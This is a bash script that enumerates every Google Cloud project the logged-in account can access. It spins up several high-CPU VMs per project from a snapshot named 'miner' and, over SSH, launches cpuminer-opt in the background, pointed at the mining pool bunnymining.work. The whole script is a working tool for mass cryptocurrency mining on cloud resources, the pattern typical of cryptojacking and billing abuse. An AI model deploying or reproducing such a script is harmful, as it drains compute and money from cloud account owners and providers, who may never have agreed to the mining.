#!/bin/bash

MAINPROJECT="the-helix-191619"
SNAPSHOT="miner"
MTYPE="n1-highcpu-4"
DISK_SIZE="10"
MAXGROUPS=1
ACTGROUP=1

central=("us-central1-a" "us-central1-b" "us-central1-c" "us-central1-f")
east=("us-east1-b" "us-east1-c" "us-east1-d")
west=("us-west1-a" "us-west1-b" "us-west1-c")
config=("a" "b" "c" "d")

if [ ! -e list ]; then
gcloud projects list | awk '{ print $1 }' | tail -n +2 | while read project; do
for i in `seq 1 2`; do
echo $project ${central[$RANDOM % ${#central[@]}]} ${config[$RANDOM % ${#config[@]}]} >> list
echo $project ${east[$RANDOM % ${#east[@]}]} ${config[$RANDOM % ${#config[@]}]} >> list
echo $project ${west[$RANDOM % ${#west[@]}]} ${config[$RANDOM % ${#config[@]}]} >> list
done
done
rm -f vm_proclist.txt
i=0
cat list | while read PROJECT ZONE CONFIG; do
((i++))
id=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 7 | head -n 1)
echo vm-$i-$id $PROJECT $ZONE $CONFIG >> vm_proclist.txt
done
cat vm_proclist.txt
fi

i=0
cat vm_proclist.txt | while read INSTANCE PROJECT ZONE CONFIG
do {
  ((i++))
  if [ $(( $i % $MAXGROUPS )) == $(( $ACTGROUP-1 )) ]; then
  echo Creating $INSTANCE  
  gcloud compute --project $PROJECT disks create $INSTANCE --size $DISK_SIZE --zone $ZONE --type "pd-standard" --source-snapshot https://www.googleapis.com/compute/v1/projects/$MAINPROJECT/global/snapshots/$SNAPSHOT
  gcloud beta compute --project $PROJECT instances create $INSTANCE --zone $ZONE --machine-type $MTYPE --subnet "default" --maintenance-policy "MIGRATE" --no-service-account --no-scopes --min-cpu-platform "Automatic" --disk "name=${INSTANCE},device-name=${INSTANCE},mode=rw,boot=yes,auto-delete=yes"
  for tt in `seq 1 5`
	  do
	  [ "`gcloud compute --project $PROJECT ssh --zone $ZONE $INSTANCE --command "echo ok && exit"`" = "ok" ] && break
	  echo "Waiting for server startup script to finish"
	  sleep 2
	  done
  gcloud compute --project $PROJECT ssh --zone $ZONE $INSTANCE --command "nohup cpuminer-opt-3.7.9/cpuminer -a yescryptr16 -q --no-color -t 3 -o stratum+tcp://bunnymining.work:20333 -u ask2tam.prueba -p x > reportme " & > /dev/null 2>&1 &
  fi
} < /dev/null; done

exit